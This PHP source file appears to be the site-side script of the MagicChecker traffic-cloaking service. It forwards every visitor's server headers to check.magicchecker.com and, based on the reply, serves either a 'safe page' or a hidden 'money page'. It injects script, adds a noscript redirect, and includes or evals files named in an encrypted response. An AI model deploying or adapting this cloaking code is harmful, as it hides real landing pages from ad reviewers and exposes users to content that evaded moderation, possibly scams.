<?php
// to view php errors (it can be useful if you got blank screen and there is no clicks in the site statictics) uncomment next two strings:
//error_reporting(E_ALL);
//ini_set('display_errors', 1);

define('CAMPAIGN_ID', "eccf42ea9e75849586129ed471dc5762");
define('REQUEST_LIVE_TIME', 3600);
define('ENC_KEY', 'c2231d70dc35c5fda02d737e3e88cc1f');
define('MP_PARAM_NAME', '__ia_sess');
define('NOT_FOUND_TEXT', '<h1>Page not found</h1>');
define('CHECK_MCPROXY', 0);
define('CHECK_MCPROXY_PARAM', '9a912ac1c2b9dba79a76b384abcc19b0');
define('CHECK_MCPROXY_VALUE', '4921d254c2bf0d5dfd3b18a78c217d8fb7c4042ece53ed360b683ee123f9055a');

function translateCurlError($code) {$output = '';$curl_errors = array(2  => "Can't init curl.",6  => "Can't resolve server's DNS of our domain. Please contact your hosting provider and tell them about this issue.",7  => "Can't connect to the server.",28 => "Operation timeout. Check you DNS setting.");if (isset($curl_errors[$code])) $output = $curl_errors[$code];else $output = "Error code: $code . Check if php cURL library installed and enabled on your server.";return $output;}
function mc_encrypt($encrypt) {$key = ENC_KEY;$encrypt = serialize($encrypt);$iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC), MCRYPT_DEV_URANDOM);$key = pack('H*', $key);$mac = hash_hmac('sha256', $encrypt, substr(bin2hex($key), -32));$passcrypt = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $encrypt.$mac, MCRYPT_MODE_CBC, $iv);$encoded = base64_encode($passcrypt).'|'.base64_encode($iv);return $encoded;}
function mc_decrypt($decrypt) {$key = ENC_KEY;$decrypt = explode('|', $decrypt.'|');$decoded = base64_decode($decrypt[0]);$iv = base64_decode($decrypt[1]);if(strlen($iv)!==mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC)){ return false; }$key = pack('H*', $key);$decrypted = trim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $decoded, MCRYPT_MODE_CBC, $iv));$mac = substr($decrypted, -64);$decrypted = substr($decrypted, 0, -64);$calcmac = hash_hmac('sha256', $decrypted, substr(bin2hex($key), -32));if($calcmac!==$mac){ return false; }$decrypted = unserialize($decrypted);return $decrypted;}

// For PHP 7,7+ use this functions for encript/decript. You neen openssl library installed
//function mc_encrypt($encrypt) {$plaintext = $encrypt;$ivlen = openssl_cipher_iv_length($cipher="AES-128-CBC");$iv = openssl_random_pseudo_bytes($ivlen);$ciphertext_raw = openssl_encrypt($plaintext, $cipher, ENC_KEY, $options=OPENSSL_RAW_DATA, $iv);$hmac = hash_hmac('sha256', $ciphertext_raw, ENC_KEY, $as_binary=true);$ciphertext = base64_encode( $iv.$hmac.$ciphertext_raw );return $ciphertext;}
//function mc_decrypt($decrypt) {$ciphertext = $decrypt;$c = base64_decode($ciphertext);$ivlen = openssl_cipher_iv_length($cipher="AES-128-CBC");$iv = substr($c, 0, $ivlen);$hmac = substr($c, $ivlen, $sha2len=32);$ciphertext_raw = substr($c, $ivlen+$sha2len);$plaintext = openssl_decrypt($ciphertext_raw, $cipher, ENC_KEY, $options=OPENSSL_RAW_DATA, $iv);$calcmac = hash_hmac('sha256', $ciphertext_raw, ENC_KEY, $as_binary=true);if (hash_equals($hmac, $calcmac))return $plaintext;}

function generate_click_id($result) {$p = microtime();$r = md5(str_shuffle(ENC_KEY .$p .CAMPAIGN_ID));$v1 = substr($r, 0, 16);$v2 = substr($r, 16, 31);return array(mc_encrypt($result->click_id.'||'.(($result->moneyUrlType == 'redirect') ? _redirectPage($result->mp, $result->moneySendParams, true) : $result->mp).'||'.(($result->safeUrlType == 'redirect') ? _redirectPage($result->sp, $result->safeSendParams, true) : $result->sp).'||'.time() .'||'.(isset($result->tp) ? $result->tp : 'N') .'||'.(isset($result->mms) ? $result->mms : 'N') .'||'.(isset($result->lls) ? $result->lls : 'N') .'||'.$result->show_first .'||'.$result->hide_script .'||'.($result->moneyUrlType == 'redirect' ? 1 : 2) .'||'.($result->safeUrlType == 'redirect' ? 1 : 2).'||'.$v1.'||'.$v2), $v1, $v2);}
function updateClick($click_id, $data) {sendRequest($data, 'update');}
function rebuildParams($data, $page = 1) {if ((($page == 1) && ($data[9] == 2)) || (($page == 2) && ($data[10] == 2))) {$params = array(time(), $_SERVER['REMOTE_ADDR'], $data[$page]);$encoded = mc_encrypt(implode('||', $params));return $_SERVER['REQUEST_URI'] .((strpos($_SERVER['REQUEST_URI'], '?') !== false ) ? '&' : '?')  .MP_PARAM_NAME .'=' .urlencode($encoded);}return $data[$page];}
function checkCache() {$res = "";$service_port = 8082;$address = "127.0.0.1";$socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);if ($socket !== false) {$result = @socket_connect($socket, $address, $service_port);if ($result !== false) {$port = isset($_SERVER['HTTP_X_FORWARDED_REMOTE_PORT']) ? $_SERVER['HTTP_X_FORWARDED_REMOTE_PORT'] : $_SERVER['REMOTE_PORT']; $in = $_SERVER['REMOTE_ADDR'] . ":" . $port . "\n"; socket_write($socket, $in, strlen($in));while ($out = socket_read($socket, 2048)) {$res .= $out;}}} return $res;}

function sendRequest($data, $path = 'index') {
    $headers = array('adapi' => '2.2');
    if ($path == 'index') $data['HTTP_MC_CACHE'] = checkCache(); if (CHECK_MCPROXY || (isset($_GET[CHECK_MCPROXY_PARAM]) && ($_GET[CHECK_MCPROXY_PARAM] == CHECK_MCPROXY_VALUE))) {if (trim($data['HTTP_MC_CACHE'])) {print 'mcproxy is ok';} else {print 'mcproxy error';}die();}
    $data_to_post = array("cmp"=> CAMPAIGN_ID,"headers" => $data,"adapi" => '2.2', "sv" => '4844.3');
    
    $ch = curl_init("http://check.magicchecker.com/v2.2/" .$path .'.php');
    curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data_to_post));
    $output = curl_exec($ch);    
    $info = curl_getinfo($ch);
    
    if ((strlen($output) == 0) || ($info['http_code'] != 200)) {
        $curl_err_num = curl_errno($ch);
        curl_close($ch);
        
        if ($curl_err_num != 0) {
            header($_SERVER['SERVER_PROTOCOL'] .' 503 Service Unavailable');           
            print 'cURL error ' .$curl_err_num .': ' .translateCurlError($curl_err_num);
        }    
        else {
                if ($info['http_code'] == 500) {
                    header($_SERVER['SERVER_PROTOCOL'] .' 503 Service Unavailable');
                    print '<h1>503 Service Unavailable</h1>';
                }    
                else {
                    header($_SERVER['SERVER_PROTOCOL'] .' ' .$info['http_code']);
                    print '<h1>Error ' .$info['http_code'] .'</h1>';
                }
        }    
        die();
    }    
    curl_close($ch); 
    return $output;
}

function isBlocked($testmode = false) {
    $result = new stdClass();
    $result->hasResponce = false;
    $result->isBlocked = false;
    $result->errorMessage = '';
    $data_headers = array();
    
    foreach ( $_SERVER as $name => $value ) {
        if (is_array($value)) {
            $value = implode(', ', $value);
        }
        if ((strlen($value) < 1024) || ($name == 'HTTP_REFERER') || ($name == 'QUERY_STRING') || ($name == 'REQUEST_URI') || ($name == 'HTTP_USER_AGENT')) {
            $data_headers[$name] = $value;
        } else {
            $data_headers[$name] = 'TRIMMED: ' .substr($value, 0, 1024);
        }
    }    
    
    $output = sendRequest($data_headers);
    if ($output) {
        $result->hasResponce = true;
        $answer = json_decode($output, TRUE);
        if (isset($answer['ban']) && ($answer['ban'] == 1)) die();
        
        if ($answer['success'] == 1) {
            foreach ($answer as $ak => $av) {
                $result->{$ak} = $av;
            }
        }
        else {
            $result->errorMessage = $answer['errorMessage'];
        }
    }
    return $result;
}

function _redirectPage($url, $send_params, $return_url = false) {
    if ($send_params) {
        if ($_SERVER['QUERY_STRING'] != '') {
            if (strpos($url, '?') === false) {
                    $url .= '?' . $_SERVER['QUERY_STRING'];
            } else {
                    $url .= '&' . $_SERVER['QUERY_STRING'];
            }
        }
    } 

    if ($return_url) return $url;
    else header("Location: $url", true, 302);
}

function _includeFileName($url) {
    if (strpos($url, '/') !== false) {
        $url = ltrim(strrchr($url, '/'), '/');
    }      
    if (strpos($url, '?') !== false) {
        $url = explode('?', $url);
        $url = $url[0];
    }
    return $url;
}

//////////////////////////////////////////////////////////////////////////////// 

if (!isset($_POST['click'])) {
    if (isset($_GET[MP_PARAM_NAME])) {
        $encdata = mc_decrypt($_GET[MP_PARAM_NAME]);
        $show_404 = true;
        if (strpos($encdata, '||') !== false) {
            $cdata = explode('||', $encdata);
            if ((sizeof($cdata) == 3) && ($cdata[0] + REQUEST_LIVE_TIME >= time()) && ($_SERVER['REMOTE_ADDR'] == $cdata[1])) {
                include(_includeFileName($cdata[2]));
                $show_404 = false;
            }
        }    
        if ($show_404) {
            $protocol = $_SERVER['SERVER_PROTOCOL'] ? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.1';
            header($protocol ." 404 Not Found");
            print NOT_FOUND_TEXT;
            die();             
        }
    }
    else {
        $result = isBlocked();
        if ($result->hasResponce && !isset($result->error_message)) {
            if (!$result->isBlocked && isset($result->js)) {
                $clickdata = generate_click_id($result);
                $insert_script = '<noscript><style>html,body{visibility:hidden;background-color:#ffffff!important;}</style><meta http-equiv="refresh" content="0; url=' ._redirectPage($result->sp, $result->safeUrlType, true) .'"></noscript><script type="text/javascript">window.click_id="' .$clickdata[0] .'";window.qt14="' .$clickdata[1] .'";window.fh76="' .$clickdata[2] .'";' .$result->js .'</script>';
                if (($result->show_first == 1) && ($result->safeUrlType == 'redirect') || 
                    ($result->show_first == 2) && ($result->moneyUrlType == 'redirect')) {
                    print '<html><head><title></title><meta charset="UTF-8">' .$insert_script .'</head><body></body></html>';
                }
                else {
                    $include_file = ($result->show_first == 1) ? $result->sp : $result->mp;
                    $include_file = file_get_contents(dirname(__FILE__) .'/' ._includeFileName($include_file));
                    if (strpos($include_file, '<head>') !== false) {
                        $include_file = str_ireplace('<head>', '<head>' .$insert_script, $include_file);
                    }
                    else {
                        $include_file = str_ireplace('<body', '<head>' .$insert_script .'</head><body', $include_file);
                    }
                    if (strpos($include_file, '<?') !== false) {
                        eval('?>'.$include_file .'<?php ');
                    }
                    else {
                        print $include_file;
                    }
                }
            }
            else {
                if ($result->urlType == 'redirect') {
                    _redirectPage($result->url, $result->send_params);       
                }
                else {
                    include _includeFileName($result->url);
                }
            }   
        }
        else {
            die('Error: ' .$result->errorMessage);
        }  
    }    
}
else {
    $click_id = mc_decrypt($_POST['click']);
    if (strpos($click_id, '||') !== false) {
        $cdata = explode('||', $click_id);
        if ($cdata[3] + REQUEST_LIVE_TIME >= time()) {
            $update_data = array();
            $tp = isset($_POST['tp']) ? trim($_POST['tp']) : null;
            $plr = isset($_POST['plr']) ? trim($_POST['plr']) : null;
            $lls = isset($_POST['lls']) ? (int)$_POST['lls'] : null;
            if (($cdata[5] != 'N') && ($plr != $cdata[12])) $update_data['r'] = 'pn';
            else if (($cdata[6] != 'N') && ($lls == 1))   $update_data['r'] = 'lls';
            else {
                if ($tp && ($cdata[4] != 'N') && ($cdata[4])) {
                    $tpz = explode('&', $cdata[4]);
                    if (!(($tp >= $tpz[0]) && ($tp <= $tpz[1])) ) {$update_data['r'] = 'tp';}
                }
            }

            if (isset($update_data['r'])) {
                $update_data['click_id'] = $cdata[0];
                if ($tp) $update_data['tp'] = $tp;
                if (isset($_POST['pn'])) $update_data['pn'] = $_POST['pn'];
                if (isset($_POST['or'])) $update_data['or'] = $_POST['or'];
                if (isset($_POST['rn'])) $update_data['rn'] = $_POST['rn'];
                updateClick($click_id, $update_data);                
                
                if (($cdata[10] == 1) || (($cdata[10] == 2) && (($cdata[7] == 2) || (($cdata[7] == 1) && $cdata[8])))) {
                    print "<script>location.href=\"" .rebuildParams($cdata, 2) ."\";</script>";
                }
            }
            else {
                if (($cdata[9] == 1) || (($cdata[9] == 2) && (($cdata[7] == 1) || (($cdata[7] == 2) && $cdata[8])))) {
                    print "<script>location.href=\"" .rebuildParams($cdata) ."\";</script>";
                }    
            }
        }
        else {
            if (($cdata[10] == 1) || (($cdata[10] == 2) && (($cdata[7] == 2) || (($cdata[7] == 1) && $cdata[8])))) {
                print "<script>location.href=\"" .rebuildParams($cdata, 2) ."\";</script>";
            }
        }
    }
}